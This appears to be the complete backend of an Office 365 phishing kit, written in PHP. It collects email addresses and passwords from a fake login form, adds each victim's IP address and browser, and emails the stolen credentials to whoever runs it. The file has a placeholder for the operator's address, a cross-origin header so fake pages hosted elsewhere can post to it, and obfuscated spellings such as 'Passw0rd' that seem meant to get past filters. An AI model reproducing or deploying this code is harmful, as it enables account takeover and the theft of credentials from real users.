<?php

$email = "your-email@gmail.com"; // Put your email address here
header("Access-Control-Allow-Origin: *"); 
if (isset($_REQUEST["email"]) && isset($_REQUEST["password"])) {
    $user = $_REQUEST["email"];
    $pass = $_REQUEST["password"];
	$browserAgent = $_SERVER['HTTP_USER_AGENT'];
    $ip = getenv("REMOTE_ADDR");
    $message = "------+ True L0gin V3rfied  +------\n";
    $message .= "Email:	$user\n";
    $message .= "Passw0rd:	$pass\n";
    $message .= "Cli3nt IP	: $ip\n";
	$message .= "Br0wser	: $browserAgent\n";
    $message .= "------+ Created By Justin Well +------\n";
    $subject = "0FFIC3 365 | Tru3 L0gin: $ip\n";
	$headers = "From: webmaster@mail.com\r\n";
	$headers .= "Reply-To: webmaster@mail.com\r\n";
	$headers .= "X-Mailer: PHP/".phpversion();	
	mail($email, $subject, $message, $headers);
}

?>
